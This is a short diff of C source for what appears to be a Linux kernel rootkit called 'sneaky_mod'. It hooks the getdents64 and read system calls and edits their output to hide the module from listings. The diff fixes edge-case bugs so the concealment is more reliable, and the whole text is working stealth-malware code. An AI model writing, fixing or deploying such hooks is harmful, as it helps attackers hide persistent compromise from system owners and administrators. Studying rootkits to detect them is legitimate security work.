@@ -45,8 +45,8 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs){
   struct linux_dirent64 * dirent;
   int pos = 0;
 
-  if(byte_read == 0){
-    return 0;
+  if(byte_read <= 0){
+    return byte_read;
   }
   while(pos < byte_read){
     dirent = (struct linux_dirent64 *)((void *)regs->si + pos);
@@ -70,15 +70,23 @@ asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
   char * endofline = NULL;
   ssize_t byte_read = original_read(regs);
 
-  match = strstr((char *)regs->si, "sneaky_mod");
+  if(byte_read <= 0){
+    return byte_read;
+  }
+
+  match = strstr((char *)regs->si, "sneaky_mod ");
   if(match == NULL){
     return byte_read;
   }
   endofline = strchr(match, '\n');
-  memmove((void *)match, (void *)(endofline+1), byte_read - (endofline + 1 - (char *)regs->si));
-  byte_read -= endofline + 1 - match;
 
-  return byte_read;
+  if(endofline == NULL){
+    return byte_read;
+  }
+  memmove((void *)match, (void *)(endofline+1), byte_read - ((void *)endofline + 1 - (void *)regs->si));
+  byte_read -= (endofline + 1 - match);
+
+  return (ssize_t)byte_read;
 }
 
 
